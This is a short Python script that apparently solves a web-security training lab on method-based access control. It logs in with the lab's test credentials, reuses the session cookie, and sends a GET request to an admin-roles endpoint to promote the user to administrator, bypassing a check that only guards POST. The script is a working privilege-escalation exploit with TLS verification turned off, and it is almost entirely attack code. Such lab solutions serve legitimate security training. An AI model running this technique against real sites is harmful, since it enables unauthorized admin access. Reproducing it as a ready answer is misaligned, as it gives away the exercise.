import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Method-based access control can be circumvented"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Login as wiener\n2. Upgrade wiener to be an admin via GET method instead of POST\n""")

    print(Fore.WHITE + "[1] Logging in as wiener")
    data = {"username": "wiener", "password": "peter"}
    login_as_wiener = requests.post(
        f"{url}/login", data=data, verify=False, allow_redirects=False, proxies=proxies)
    
    print(Fore.WHITE + "[2] Upgrading wiener to be an admin via GET method instead of POST")
    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }

    try:
        r = requests.get(
            f"{url}/admin-roles?username=wiener&action=upgrade", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
